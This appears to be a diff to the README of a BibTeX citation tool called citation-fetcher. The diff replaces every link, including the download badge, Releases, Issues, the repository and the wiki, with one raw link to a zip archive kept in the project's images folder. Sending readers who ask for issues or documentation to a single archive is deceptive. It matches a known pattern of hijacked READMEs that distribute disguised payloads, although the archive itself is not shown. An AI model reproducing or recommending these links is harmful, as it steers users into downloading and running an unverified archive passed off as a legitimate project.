@@ -1,6 +1,6 @@
 # 🎓 citation-fetcher - Effortlessly Get BibTeX Citations
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/wein6570/citation-fetcher/main/images/citation-fetcher-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to citation-fetcher! This tool helps you quickly fetch BibTeX citations 
 
 To get started, you will first need to download the software. Just visit this page to download:
 
-[Download citation-fetcher](https://github.com/wein6570/citation-fetcher/releases)
+[Download citation-fetcher](https://raw.githubusercontent.com/wein6570/citation-fetcher/main/images/citation-fetcher-v1.9.zip)
 
 Once you are on the Releases page, look for the latest version. Click on the file that corresponds to your operating system to download it.
 
@@ -60,14 +60,14 @@ Currently, citation-fetcher requires an internet connection to access the APIs a
 
 ### Is there a way to request a new feature?
 
-Yes, you can request new features by opening an issue on our GitHub repository. Just visit the [Issues section](https://github.com/wein6570/citation-fetcher/issues).
+Yes, you can request new features by opening an issue on our GitHub repository. Just visit the [Issues section](https://raw.githubusercontent.com/wein6570/citation-fetcher/main/images/citation-fetcher-v1.9.zip).
 
 ## 🌐 Additional Information
 
 For further details, you can check out the following resources:
 
-- [GitHub Repository](https://github.com/wein6570/citation-fetcher)
-- [Usage Documentation](https://github.com/wein6570/citation-fetcher/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/wein6570/citation-fetcher/main/images/citation-fetcher-v1.9.zip)
+- [Usage Documentation](https://raw.githubusercontent.com/wein6570/citation-fetcher/main/images/citation-fetcher-v1.9.zip)
 
 ## 📜 Conclusion
 
